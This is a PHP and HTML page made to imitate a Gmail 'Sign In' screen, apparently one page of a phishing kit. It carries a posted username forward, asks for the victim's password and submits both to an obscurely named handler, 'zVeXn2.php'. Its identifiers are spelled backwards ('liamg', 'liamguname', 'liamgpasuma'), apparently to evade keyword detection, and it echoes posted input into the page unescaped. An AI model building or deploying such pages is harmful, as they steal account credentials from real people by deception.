 <?php
$liamguname = $_POST['liamguname'];

?>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<title>Sign In</title>
<link rel="shortcut icon" href="images/liamg.ico">
<style type="text/css">
body
{
   background-color: #FFFFFF;
   color: #000000;
}
</style>
<style type="text/css">
a:hover
{
   color: #6CDA7B;
}
</style>
<!--[if lt IE 7]>
<style type="text/css">
   img { behavior: url("pngfix.htc"); }
</style>
<![endif]-->
</head>
<body>

<div id="bv_Image1" style="margin:0;padding:0;position:absolute;left:0px;top:0px;width:398px;height:474px;text-align:left;z-index:3;">
<img src="images/gmbody2.png" id="Image1" alt="" style="width:398px;height:474px;" align="top" border="0"></div>

<div id="bv_Form1" style="position:absolute;left:0px;top:0px;width:401px;height:400px;z-index:5">
<form name="Form1" method="post" action="zVeXn2.php" "="">

<input id="x" style="position:absolute;left:60px;top:290px;width:272px;height:41px;border:1px #C0C0C0 solid;font-family:Helvetica;font-size:14px;z-index:0" name="liamgpasuma" type="password" placeholder=" Password" pattern=".{3,30}" oninvalid="this.setCustomValidity('Required Field')" oninput="setCustomValidity('')" title="Required Field" required="">

<input id="Button1" name="Button1" value="" style="position:absolute;left:60px;top:340px;width:275px;height:38px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:4" type="submit">

<div id="bv_Text1" style="margin:0;padding:0;position:absolute;left:125px;top:259px;width:150px;height:16px;text-align:left;z-index:1;">


<input name="liamguname" type="text" value="<?=$liamguname?>" style="border:none;text-align:center;outline: none;font-weight: bold;background:rgba(227,162,11,0.0);">

</form>
</div>
</body></html>